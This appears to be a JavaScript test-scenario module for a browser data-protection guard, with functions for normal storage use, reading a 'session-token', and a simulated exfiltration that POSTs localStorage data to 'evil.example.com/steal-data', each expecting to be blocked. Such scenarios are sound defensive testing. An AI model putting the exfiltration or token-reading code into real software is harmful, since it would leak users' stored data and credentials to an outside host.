export async function runNormalBehavior() {
  localStorage.setItem("theme", "dark");

  localStorage.getItem("theme");

  try {
    await fetch(window.location.href);
  } catch (error) {
    console.error("Normal behavior scenario error:", error);
  }
}

export function runProtectedDataAccess() {
  try {
    localStorage.getItem("session-token");
  } catch (error) {
    console.error("Protected data access blocked:", error);
  }
}

export async function runDataExfiltration() {
  const data = localStorage.getItem("theme");

  try {
    await fetch("https://evil.example.com/steal-data", {
      method: "POST",
      body: data ?? "no-data",
    });
  } catch (error) {
    console.error("Data exfiltration blocked:", error);
  }
}